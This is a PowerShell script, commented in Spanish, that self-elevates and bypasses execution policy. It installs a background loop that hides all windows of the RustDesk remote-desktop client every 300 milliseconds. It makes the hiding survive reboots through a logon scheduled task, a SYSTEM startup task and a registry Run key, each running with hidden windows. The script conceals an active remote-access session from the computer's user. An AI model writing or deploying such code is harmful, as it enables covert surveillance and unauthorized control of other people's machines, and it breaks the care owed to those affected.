# ==================================================
# Ocultar RustDesk de la barra de tareas/notificaciones
# Sobrevive reinicios - 3 métodos redundantes
# ==================================================
Set-ExecutionPolicy Bypass -Scope Process -Force

# Auto-elevación (necesaria para registrar tareas)
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Start-Process PowerShell -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
    exit
}

 $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
 $scriptPath  = "C:\ProgramData\RustDeskSilent\rustdesk-silent.ps1"

# ============================================
# CREAR EL SCRIPT DE MONITOREO
# ============================================

New-Item -ItemType Directory -Path (Split-Path $scriptPath) -Force | Out-Null

 $scriptContent = @'
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("user32.dll")]
    public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);
    [DllImport("user32.dll")]
    public static extern bool EnumWindows(EnumWindowsProc enumProc, IntPtr lParam);
    [DllImport("user32.dll")]
    public static extern int GetWindowText(IntPtr hWnd, System.Text.StringBuilder lpString, int nMaxCount);
    [DllImport("user32.dll")]
    public static extern bool IsWindowVisible(IntPtr hWnd);
    [DllImport("user32.dll")]
    public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
    [DllImport("user32.dll", SetLastError = true)]
    public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
    public delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);
}
"@

function Hide-RustDeskWindows {
    $pids = (Get-Process -Name "rustdesk" -ErrorAction SilentlyContinue).Id
    if ($pids) {
        [Win32]::EnumWindows({
            param($h, $l)
            [uint32]$id = 0
            [Win32]::GetWindowThreadProcessId($h, [ref]$id) | Out-Null
            if ($pids -contains [int]$id) {
                [Win32]::ShowWindowAsync($h, 0) | Out-Null
            }
            return $true
        }, [IntPtr]::Zero) | Out-Null
    }
    
    $hwnd = [Win32]::FindWindow("RustDesk", $null)
    if ($hwnd -ne [IntPtr]::Zero) {
        [Win32]::ShowWindowAsync($hwnd, 0) | Out-Null
    }
}

# Esperar a que RustDesk exista (hasta 90 segundos)
 $waited = 0
while ($waited -lt 90) {
    if (Get-Process -Name "rustdesk" -ErrorAction SilentlyContinue) {
        Start-Sleep -Seconds 3
        break
    }
    Start-Sleep -Seconds 1
    $waited++
}

# Bucle infinito
while ($true) {
    Hide-RustDeskWindows
    Start-Sleep -Milliseconds 300
}
'@

[System.IO.File]::WriteAllText($scriptPath, $scriptContent, [System.Text.Encoding]::UTF8)

# ============================================
# MÉTODO 1: Tarea al inicio de sesión
# ============================================

Unregister-ScheduledTask -TaskName "RustDeskSilentUser" -Confirm:$false -ErrorAction SilentlyContinue

 $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -File `"$scriptPath`""
 $trigger = New-ScheduledTaskTrigger -AtLogOn -User $currentUser
 $trigger.Delay = "PT15S"

 $principal = New-ScheduledTaskPrincipal -UserId $currentUser -LogonType Interactive -RunLevel Highest

 $settings = New-ScheduledTaskSettingsSet `
    -ExecutionTimeLimit ([TimeSpan]::Zero) `
    -RestartCount 5 `
    -RestartInterval (New-TimeSpan -Minutes 1) `
    -MultipleInstances IgnoreNew `
    -AllowStartIfOnBatteries `
    -DontStopIfGoingOnBatteries `
    -StartWhenAvailable

Register-ScheduledTask -TaskName "RustDeskSilentUser" -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force | Out-Null

# ============================================
# MÉTODO 2: Tarea al inicio del sistema (SYSTEM)
# ============================================

Unregister-ScheduledTask -TaskName "RustDeskSilentSystem" -Confirm:$false -ErrorAction SilentlyContinue

 $sysAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -File `"$scriptPath`""
 $sysTrigger = New-ScheduledTaskTrigger -AtStartup
 $sysPrincipal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
 $sysSettings = New-ScheduledTaskSettingsSet `
    -ExecutionTimeLimit ([TimeSpan]::Zero) `
    -RestartCount 5 `
    -RestartInterval (New-TimeSpan -Minutes 1) `
    -MultipleInstances IgnoreNew `
    -StartWhenAvailable

Register-ScheduledTask -TaskName "RustDeskSilentSystem" -Action $sysAction -Trigger $sysTrigger -Principal $sysPrincipal -Settings $sysSettings -Force | Out-Null

# ============================================
# MÉTODO 3: Registry Run key (respaldo)
# ============================================

 $regPath = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
 $regValue = 'powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "' + $scriptPath + '"'
Set-ItemProperty -Path $regPath -Name "RustDeskSilent" -Value $regValue -Force

# ============================================
# Ejecutar inmediatamente
# ============================================

Start-Sleep -Seconds 2
Start-Process powershell -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -File `"$scriptPath`""

Write-Host ""
Write-Host "===============================" -ForegroundColor Green
Write-Host "  OCULTAMIENTO CONFIGURADO" -ForegroundColor Green
Write-Host "===============================" -ForegroundColor Green
Write-Host ""
Write-Host "3 métodos activos:"
Write-Host "  [1] Tarea al inicio de sesión (delay 15s)" -ForegroundColor Cyan
Write-Host "  [2] Tarea al inicio del sistema (SYSTEM)" -ForegroundColor Cyan
Write-Host "  [3] Registry Run key" -ForegroundColor Cyan
Write-Host ""
Write-Host "Sobrevive reinicios." -ForegroundColor Yellow
Write-Host "===============================" -ForegroundColor Green